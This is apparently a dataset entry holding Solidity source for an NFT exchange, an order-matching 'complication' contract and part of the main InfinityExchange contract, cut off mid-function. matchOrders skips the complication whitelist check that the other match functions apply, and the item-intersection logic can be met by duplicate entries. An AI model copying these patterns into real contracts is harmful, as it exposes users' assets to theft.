[
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\n\n/**\n * @title InfinityOrderBookComplication\n * @author nneverlander. Twitter @nneverlander\n * @notice Complication to execute orderbook orders\n */\ncontract InfinityOrderBookComplication is IComplication, Ownable {\n  // ======================================================= EXTERNAL FUNCTIONS ==================================================\n\n  /**\n   * @notice Checks whether one to one matches can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have one NFT only, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder1 first makerOrder\n   * @param makerOrder2 second makerOrder\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOneToOne(OrderTypes.MakerOrder calldata makerOrder1, OrderTypes.MakerOrder calldata makerOrder2)\n    external\n    view\n    override\n    returns (bool, uint256)\n  {\n    bool numItemsValid = makerOrder2.constraints[0] == makerOrder1.constraints[0] &&\n      makerOrder2.constraints[0] == 1 &&\n      makerOrder2.nfts.length == 1 &&\n      makerOrder2.nfts[0].tokens.length == 1 &&\n      makerOrder1.nfts.length == 1 &&\n      makerOrder1.nfts[0].tokens.length == 1;\n    bool _isTimeValid = makerOrder2.constraints[3] <= block.timestamp &&\n      makerOrder2.constraints[4] >= block.timestamp &&\n      makerOrder1.constraints[3] <= block.timestamp &&\n      makerOrder1.constraints[4] >= block.timestamp;\n    bool _isPriceValid = false;\n    uint256 makerOrder1Price = _getCurrentPrice(makerOrder1);\n    uint256 makerOrder2Price = _getCurrentPrice(makerOrder2);\n    uint256 execPrice;\n    if (makerOrder1.isSellOrder) {\n      _isPriceValid = makerOrder2Price >= makerOrder1Price;\n      execPrice = makerOrder1Price;\n    } else {\n      _isPriceValid = makerOrder1Price >= makerOrder2Price;\n      execPrice = makerOrder2Price;\n    }\n    return (\n      numItemsValid && _isTimeValid && doItemsIntersect(makerOrder1.nfts, makerOrder2.nfts) && _isPriceValid,\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether one to matches matches can be executed\n   * @dev This function is called by the main exchange to check whether one to many matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder the one makerOrder\n   * @param manyMakerOrders many maker orders\n   * @return returns whether the order can be executed\n   */\n  function canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n\n  /**\n   * @notice Checks whether match orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param sell sell order\n   * @param buy buy order\n   * @param constructedNfts - nfts constructed by the off chain matching engine\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOrder(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) external view override returns (bool, uint256) {\n    (bool _isPriceValid, uint256 execPrice) = isPriceValid(sell, buy);\n    return (\n      isTimeValid(sell, buy) &&\n        _isPriceValid &&\n        areNumItemsValid(sell, buy, constructedNfts) &&\n        doItemsIntersect(sell.nfts, constructedNfts) &&\n        doItemsIntersect(buy.nfts, constructedNfts) &&\n        doItemsIntersect(sell.nfts, buy.nfts),\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether take orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n          and whether the nfts intersect\n   * @param makerOrder the maker order\n   * @param takerItems the taker items specified by the taker\n   * @return returns whether order can be executed\n   */\n  function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    external\n    view\n    override\n    returns (bool)\n  {\n    return (makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp &&\n      areTakerNumItemsValid(makerOrder, takerItems) &&\n      doItemsIntersect(makerOrder.nfts, takerItems));\n  }\n\n  // ======================================================= PUBLIC FUNCTIONS ==================================================\n\n  /// @dev checks whether the orders are active and not expired\n  function isTimeValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool)\n  {\n    return\n      sell.constraints[3] <= block.timestamp &&\n      sell.constraints[4] >= block.timestamp &&\n      buy.constraints[3] <= block.timestamp &&\n      buy.constraints[4] >= block.timestamp;\n  }\n\n  /// @dev checks whether the price is valid; a buy order should always have a higher price than a sell order\n  function isPriceValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool, uint256)\n  {\n    (uint256 currentSellPrice, uint256 currentBuyPrice) = (_getCurrentPrice(sell), _getCurrentPrice(buy));\n    return (currentBuyPrice >= currentSellPrice, currentSellPrice);\n  }\n\n  /// @dev sanity check to make sure the constructed nfts conform to the user signed constraints\n  function areNumItemsValid(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) public pure returns (bool) {\n    uint256 numConstructedItems = 0;\n    uint256 nftsLength = constructedNfts.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numConstructedItems += constructedNfts[i].tokens.length;\n        ++i;\n      }\n    }\n    return numConstructedItems >= buy.constraints[0] && buy.constraints[0] <= sell.constraints[0];\n  }\n\n  /// @dev sanity check to make sure that a taker is specifying the right number of items\n  function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 numTakerItems = 0;\n    uint256 nftsLength = takerItems.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numTakerItems += takerItems[i].tokens.length;\n        ++i;\n      }\n    }\n    return makerOrder.constraints[0] == numTakerItems;\n  }\n\n  /**\n   * @notice Checks whether nfts intersect\n   * @dev This function checks whether there are intersecting nfts between two orders\n   * @param order1Nfts nfts in the first order\n   * @param order2Nfts nfts in the second order\n   * @return returns whether items intersect\n   */\n  function doItemsIntersect(OrderTypes.OrderItem[] calldata order1Nfts, OrderTypes.OrderItem[] calldata order2Nfts)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 order1NftsLength = order1Nfts.length;\n    uint256 order2NftsLength = order2Nfts.length;\n    // case where maker/taker didn't specify any items\n    if (order1NftsLength == 0 || order2NftsLength == 0) {\n      return true;\n    }\n\n    uint256 numCollsMatched = 0;\n    // check if taker has all items in maker\n    for (uint256 i = 0; i < order2NftsLength; ) {\n      for (uint256 j = 0; j < order1NftsLength; ) {\n        if (order1Nfts[j].collection == order2Nfts[i].collection) {\n          // increment numCollsMatched\n          unchecked {\n            ++numCollsMatched;\n          }\n          // check if tokenIds intersect\n          bool tokenIdsIntersect = doTokenIdsIntersect(order1Nfts[j], order2Nfts[i]);\n          require(tokenIdsIntersect, 'tokenIds dont intersect');\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++j;\n        }\n      }\n      unchecked {\n        ++i;\n      }\n    }\n\n    return numCollsMatched == order2NftsLength;\n  }\n\n  /**\n   * @notice Checks whether tokenIds intersect\n   * @dev This function checks whether there are intersecting tokenIds between two order items\n   * @param item1 first item\n   * @param item2 second item\n   * @return returns whether tokenIds intersect\n   */\n  function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 item1TokensLength = item1.tokens.length;\n    uint256 item2TokensLength = item2.tokens.length;\n    // case where maker/taker didn't specify any tokenIds for this collection\n    if (item1TokensLength == 0 || item2TokensLength == 0) {\n      return true;\n    }\n    uint256 numTokenIdsPerCollMatched = 0;\n    for (uint256 k = 0; k < item2TokensLength; ) {\n      for (uint256 l = 0; l < item1TokensLength; ) {\n        if (\n          item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n        ) {\n          // increment numTokenIdsPerCollMatched\n          unchecked {\n            ++numTokenIdsPerCollMatched;\n          }\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++l;\n        }\n      }\n      unchecked {\n        ++k;\n      }\n    }\n\n    return numTokenIdsPerCollMatched == item2TokensLength;\n  }\n\n  // ======================================================= UTILS ============================================================\n\n  /// @dev returns the sum of current order prices; used in match one to many orders\n  function _sumCurrentPrices(OrderTypes.MakerOrder[] calldata orders) internal view returns (uint256) {\n    uint256 sum = 0;\n    uint256 ordersLength = orders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      sum += _getCurrentPrice(orders[i]);\n      unchecked {\n        ++i;\n      }\n    }\n    return sum;\n  }\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\n// external imports\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {ReentrancyGuard} from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport {IERC165} from '@openzeppelin/contracts/interfaces/IERC165.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\nimport {IERC1155} from '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {EnumerableSet} from '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';\n\n// internal imports\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\nimport {SignatureChecker} from '../libs/SignatureChecker.sol';\n\n/**\n@title InfinityExchange\n@author nneverlander. Twitter @nneverlander\n@notice The main NFT exchange contract that holds state and does asset transfers\n@dev This contract can be extended via 'complications' - strategies that let the exchange execute various types of orders\n      like dutch auctions, reverse dutch auctions, floor price orders, private sales, etc.\n\nNFTNFTNFT...........................................NFTNFTNFT\nNFTNFT                                                 NFTNFT\nNFT                                                       NFT\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.           NFTNFTNFTNFTNFTNFT   NFTNFTNFTNFTNFTNFT         .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.          NFTNFTNFTNFTNFTNFTN   NFTNFTNFTNFTNFTNFT         .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\nNFT                                                       NFT\nNFTNFT                                                 NFTNFT\nNFTNFTNFT...........................................NFTNFTNFT \n\n*/\ncontract InfinityExchange is ReentrancyGuard, Ownable {\n  using SafeERC20 for IERC20;\n  using EnumerableSet for EnumerableSet.AddressSet;\n\n  /// @dev WETH address of a chain; set at deploy time to the WETH address of the chain that this contract is deployed to\n  address public immutable WETH;\n  /// @dev Used in order signing with EIP-712\n  bytes32 public immutable DOMAIN_SEPARATOR;\n  /// @dev This is the adress that is used to send auto sniped orders for execution on chain\n  address public MATCH_EXECUTOR;\n  /// @dev Gas cost for auto sniped orders are paid by the buyers and refunded to this contract in the form of WETH\n  uint32 public WETH_TRANSFER_GAS_UNITS = 50000;\n  /// @notice Exchange fee in basis points (250 bps = 2.5%)\n  uint16 public PROTOCOL_FEE_BPS = 250;\n\n  /**\n   @dev All orders should have a nonce >= to this value. \n        Any orders with nonce value less than this are non-executable. \n        Used for cancelling all outstanding orders.\n  */\n  mapping(address => uint256) public userMinOrderNonce;\n\n  /// @dev This records already executed or cancelled orders to prevent replay attacks.\n  mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n  /// @dev Storage variable that keeps track of valid complications (order execution strategies)\n  EnumerableSet.AddressSet private _complications;\n  /// @dev Storate variable that keeps track of valid currencies (tokens)\n  EnumerableSet.AddressSet private _currencies;\n\n  event CancelAllOrders(address user, uint256 newMinNonce);\n  event CancelMultipleOrders(address user, uint256[] orderNonces);\n  event NewWethTransferGasUnits(uint32 wethTransferGasUnits);\n  event NewProtocolFee(uint16 protocolFee);\n\n  event MatchOrderFulfilled(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  event TakeOrderFulfilled(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  constructor(address _WETH, address _matchExecutor) {\n    // Calculate the domain separator\n    DOMAIN_SEPARATOR = keccak256(\n      abi.encode(\n        keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n        keccak256('InfinityExchange'),\n        keccak256(bytes('1')), // for versionId = 1\n        block.chainid,\n        address(this)\n      )\n    );\n    WETH = _WETH;\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  fallback() external payable {}\n\n  receive() external payable {}\n\n  // =================================================== USER FUNCTIONS =======================================================\n\n  /**\n   @notice Matches orders one to one where each order has 1 NFT. Example: Match 1 specific NFT buy with one specific NFT sell.\n   @dev Can execute orders in batches for gas efficiency. Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrders1 Maker order 1\n   @param makerOrders2 Maker order 2\n  */\n  function matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numMakerOrders);\n      require(_complications.contains(makerOrders1[i].execParams[0]), 'invalid complication');\n      (bool canExec, uint256 execPrice) = IComplication(makerOrders1[i].execParams[0]).canExecMatchOneToOne(\n        makerOrders1[i],\n        makerOrders2[i]\n      );\n      require(canExec, 'cannot execute');\n      _matchOneToOneOrders(\n        makerOrders1[i],\n        makerOrders2[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrder The one order to match\n   @param manyMakerOrders Array of multiple orders to match the one order against\n  */\n  function matchOneToManyOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external {\n    uint256 startGas = gasleft();\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n    require(\n      IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n      'cannot execute'\n    );\n    bytes32 makerOrderHash = _hash(makerOrder);\n    require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n    uint256 ordersLength = manyMakerOrders.length;\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    if (makerOrder.isSellOrder) {\n      for (uint256 i = 0; i < ordersLength; ) {\n        // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n        uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n        _matchOneMakerSellToManyMakerBuys(\n          makerOrderHash,\n          makerOrder,\n          manyMakerOrders[i],\n          startGasPerOrder,\n          protocolFeeBps,\n          wethTransferGasUnits,\n          weth\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    } else {\n      uint256 protocolFee;\n      for (uint256 i = 0; i < ordersLength; ) {\n        protocolFee += _matchOneMakerBuyToManyMakerSells(\n          makerOrderHash,\n          manyMakerOrders[i],\n          makerOrder,\n          protocolFeeBps\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n      uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n      // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n      // else we need to send the protocol fee separately in the execution currency\n      // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n      // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n      if (makerOrder.execParams[1] == weth) {\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n      } else {\n        IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n      }\n    }\n  }\n\n  /**\n   @notice Matches orders one to one where no specific NFTs are specified. \n          Example: A collection wide buy order with any 2 NFTs with a sell order that has any 2 NFTs from that collection.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n        The constructs param specifies the actual NFTs that will be executed since buys and sells need not specify actual NFTs - only \n        a higher level intent.\n   @param sells User signed sell orders\n   @param buys User signed buy orders\n   @param constructs Intersection of the NFTs in the sells and buys. Constructed by an off chain matching engine.\n  */\n  function matchOrders(\n    OrderTypes.MakerOrder[] calldata sells,\n    OrderTypes.MakerOrder[] calldata buys,\n    OrderTypes.OrderItem[][] calldata constructs\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numSells = sells.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numSells == buys.length && numSells == constructs.length, 'mismatched lengths');\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numSells; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numSells);\n      (bool executionValid, uint256 execPrice) = IComplication(sells[i].execParams[0]).canExecMatchOrder(\n        sells[i],\n        buys[i],\n        constructs[i]\n      );\n      require(executionValid, 'cannot execute');\n      _matchOrders(\n        sells[i],\n        buys[i],\n        constructs[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders with specific `1` NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n  */\n  function takeMultipleOneOrders(OrderTypes.MakerOrder[] calldata makerOrders) external payable nonReentrant {\n    uint256 numMakerOrders = makerOrders.length;\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      bytes32 makerOrderHash = _hash(makerOrders[i]);\n      require(isOrderValid(makerOrders[i], makerOrderHash), 'invalid maker order');\n      bool isTimeValid = makerOrders[i].constraints[3] <= block.timestamp &&\n        makerOrders[i].constraints[4] >= block.timestamp;\n      require(isTimeValid, 'invalid time');\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders where maker orders can have unspecified NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n   @param takerNfts The specific NFTs that the taker is willing to take that intersect with the higher order intent of the maker\n   Example: If a makerOrder is 'buy any one of these 2 specific NFTs', then the takerNfts would be 'this one specific NFT'.\n  */\n  function takeOrders(OrderTypes.MakerOrder[] calldata makerOrders, OrderTypes.OrderItem[][] calldata takerNfts)\n    external\n    payable\n    nonReentrant\n  {\n    uint256 ordersLength = makerOrders.length;\n    require(ordersLength == takerNfts.length, 'mismatched lengths');\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < ordersLength; ) {\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _takeOrders(makerOrders[i], takerNfts[i], execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Helper function (non exchange related) to send multiple NFTs in one go\n   @param to The orders to fulfill\n   @param items The specific NFTs to transfer\n  */\n  function transferMultipleNFTs(address to, OrderTypes.OrderItem[] calldata items) external nonReentrant {\n    _transferMultipleNFTs(msg.sender, to, items);\n  }\n\n  /**\n   * @notice Cancel all pending orders\n   * @param minNonce minimum user nonce\n   */\n  function cancelAllOrders(uint256 minNonce) external {\n    require(minNonce > userMinOrderNonce[msg.sender], 'nonce too low');\n    require(minNonce < userMinOrderNonce[msg.sender] + 1000000, 'too many');\n    userMinOrderNonce[msg.sender] = minNonce;\n    emit CancelAllOrders(msg.sender, minNonce);\n  }\n\n  /**\n   * @notice Cancel multiple orders\n   * @param orderNonces array of order nonces\n   */\n  function cancelMultipleOrders(uint256[] calldata orderNonces) external {\n    uint256 numNonces = orderNonces.length;\n    require(numNonces > 0, 'cannot be empty');\n    for (uint256 i = 0; i < numNonces; ) {\n      require(orderNonces[i] >= userMinOrderNonce[msg.sender], 'nonce too low');\n      require(!isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]], 'nonce already executed or cancelled');\n      isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]] = true;\n      unchecked {\n        ++i;\n      }\n    }\n    emit CancelMultipleOrders(msg.sender, orderNonces);\n  }\n\n  // ====================================================== VIEW FUNCTIONS ======================================================\n\n  /**\n   * @notice Check whether user order nonce is executed or cancelled\n   * @param user address of user\n   * @param nonce nonce of the order\n   * @return whether nonce is valid\n   */\n  function isNonceValid(address user, uint256 nonce) external view returns (bool) {\n    return !isUserOrderNonceExecutedOrCancelled[user][nonce] && nonce > userMinOrderNonce[user];\n  }\n\n  /**\n   * @notice Check whether a user signed order has valid signature\n   * @param order the order to verify\n   * @return whether order has valid signature\n   */\n  function verifyOrderSig(OrderTypes.MakerOrder calldata order) external view returns (bool) {\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    return SignatureChecker.verify(_hash(order), order.signer, r, s, v, DOMAIN_SEPARATOR);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param orderHash hash of the order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToManyOrders(\n    bytes32 orderHash,\n    bool verifySellOrder,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    bool _orderValid;\n    if (verifySellOrder) {\n      _orderValid = isOrderValid(sell, orderHash);\n    } else {\n      _orderValid = isOrderValid(buy, orderHash);\n    }\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      _orderValid);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n          Also checks if the given complication can execute this order\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid and the execution price\n   */\n  function verifyMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool 